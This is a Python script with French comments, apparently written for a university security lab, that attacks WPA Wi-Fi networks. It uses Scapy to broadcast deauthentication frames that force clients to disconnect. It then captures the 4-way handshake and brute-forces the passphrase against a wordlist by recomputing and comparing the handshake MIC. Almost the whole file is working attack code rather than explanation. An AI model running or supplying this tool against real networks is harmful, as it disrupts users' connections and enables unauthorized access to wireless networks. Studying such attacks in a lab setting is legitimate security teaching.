#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Ce script permet de sniffer le trafic afin de capturer un 4-way handshake WPA.
Ce script permet, ni nécessaire, de déauthentifier les clients du réseau pour accélérer le processus de capture.
La passphrase est ensuite bruteforcée à l'aide d'un dictionaire de mot fourni en paramètre.
Le bruteforce se fait en comparant le MIC généré avec le MIC du 4ème message du handshake.
"""

__author__      = "Olivier Koffi et Samuel Metler"
__copyright__   = "Copyright 2020, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "olivier.koffi@heig-vd.ch et samuel.metler@heig-vd.ch"
__status__ 		= "Prototype"


from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
import argparse


parser = argparse.ArgumentParser(prog="Scairodump",
                                 usage=" python3 scairodump.py -i [interface] -s [ssid] -d -f [wordlist file]\n",
                                 allow_abbrev=False)
parser.add_argument("-i", "--interface", required=True, help="Nom de l'interface Wi-Fi")
parser.add_argument("-s", "--ssid", required=True, help="SSID du réseau que l'on veut attaquer")
parser.add_argument("-d", "--deauth", action='store_true', help="Ajouter ce paramètre si l'on souhaite émettre une déauthentification des clients")
parser.add_argument("-f", "--wordlist", required=True, help="Liste de mots de passe que l'on veut tester")


# Variables
args = parser.parse_args()
interface = args.interface
ssid = args.ssid
deauth = args.deauth
wordlist_filename = args.wordlist
A = "Pairwise key expansion"
B = ""
APmac = ""
Clientmac = ""
ANonce = ""
SNonce = ""
Broadcat_address = "FF:FF:FF:FF:FF:FF"
handshake_counter = 0
handshake_list = list()


def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]


#####################################
#                                   #
#       WPA Params extraction       #
#                                   #
#####################################


# This function allow to manually extract the nonce from a WPA handshake payload
def extract_nonce (payload) :
    return bytes(payload[17:49]).hex()

# This function allow to manually extract the MIC from from a WPA handshake payload
def extract_mic (payload) :
    return bytes(payload[81:97]).hex()

def extract_data(pkt_list):
    global Clientmac
    global ANonce
    global SNonce

    Clientmac = pkt_list[0][Dot11].addr1
    ANonce = extract_nonce(bytes(pkt_list[0][EAPOL]))
    SNonce = extract_nonce(bytes(pkt_list[1][EAPOL]))
    Mic4 = extract_mic(bytes(pkt_list[3][EAPOL]))     # The MIC from the fourth frame WPA handshake guaranteed that it comes from a user that knows the correct passphrase.

    print ("\n\nExtracted values")
    print ("============================")
    print ("SSID: ", ssid, "\n")
    print ("AP Mac: ", APmac, "\n")
    print ("Client Mac: ", Clientmac, "\n")
    print ("AP Nonce: ", ANonce, "\n")
    print ("Client Nonce: ", SNonce,"\n")
    print ("MIC (to test): ", Mic4,"\n")

    crack_pass(pkt_list[3], Mic4)


#####################################
#                                   #
#       Crack WPA Passphrase        #
#                                   #
#####################################

def crack_pass(pkts, mic_to_test) :
    passwords_file = open(wordlist_filename,'r')
    passwords = passwords_file.readlines()
    passphrase_ret = "Not found"

    print ("\nCracking WPA Passphrase")
    print ("=============================")
    for psw in passwords :
        
        # We don't take the final '\n'
        passphrase = str.encode(psw[:-1])

        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1, passphrase, str.encode(ssid), 4096, 32)

        #expand pmk to obtain PTK
        B = min(a2b_hex(APmac.replace(":","")), a2b_hex(Clientmac.replace(":","")))+max(a2b_hex(APmac.replace(":","")),a2b_hex(Clientmac.replace(":","")))+min(a2b_hex(ANonce),a2b_hex(SNonce))+max(a2b_hex(ANonce),a2b_hex(SNonce))
        ptk = customPRF512(pmk,str.encode(A), B)

        #Check if it's MD5 or SHA1 with the KeyDescriptorVersion
        kdv = int.from_bytes(pkts[0].load[0:1], byteorder='big')

        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        if kdv == 2:
            mic = hmac.new(ptk[0:16],bytes(pkts[3][EAPOL]),hashlib.sha1).hexdigest()[:-8]
        else:
            mic = hmac.new(ptk[0:16],bytes(pkts[3][EAPOL]),hashlib.md5).hexdigest()    

        print ("Passphrase tested : ",psw)
        print (mic)
        print (mic_to_test)
            
        #Compare the MICs
        if hmac.compare_digest(mic, mic_to_test) :
            print ("\nPassphrase found !\n")
            passphrase_ret = psw
            break

    print ("\nResult of the passphrase cracking")
    print ("=============================")
    print ("The passphrase is : ",passphrase_ret,"\n")

    passwords_file.close()


#####################################
#                                   #
#         Packet handeling          #
#                                   #
#####################################


def find_handshake_pkt(pkt):

    global APmac
    global handshake_list
    global handshake_counter

    if(pkt.haslayer(Dot11Elt) and APmac == ""):
        print(pkt[Dot11Elt].info.decode())
        if(ssid == pkt[Dot11Elt].info.decode()):
            APmac = pkt[Dot11].addr2
            print("Beacon for SSID ", ssid, " found! AP MAC: ", APmac)

    if(pkt.haslayer(EAPOL) and APmac == pkt.addr3):
        handshake_list.append(pkt)
        handshake_counter = handshake_counter + 1
        print("Found " + str(handshake_counter) + " handshake(s)")
        
        if(len(handshake_list) == 4):
            extract_data(handshake_list)


#####################################
#                                   #
#               Main                #
#                                   #
#####################################


# Deauthentification
if(deauth):
    t = 5
    print("Sniffing ",t," sec")
    pkts = sniff(iface=interface, timeout=t)
    for pkt in pkts:
        if pkt.haslayer(Dot11Elt):
            if ssid == pkt.info.decode():
                # Deauth for unspecified reason (rc = 1)
                deauth_pkt = RadioTap() / Dot11(type=0, subtype=12, addr1=Broadcat_address, addr2=pkt.addr2, addr3=pkt.addr3) / Dot11Deauth(reason=1)
                print("Sending deauthentification frames")
                for i in range(0, 20):
                    sendp(deauth_pkt, iface=interface, verbose=False)
                break

# Sniffing packets
print("Sniffing packets ...")
pkts = sniff(iface=interface, prn=find_handshake_pkt)

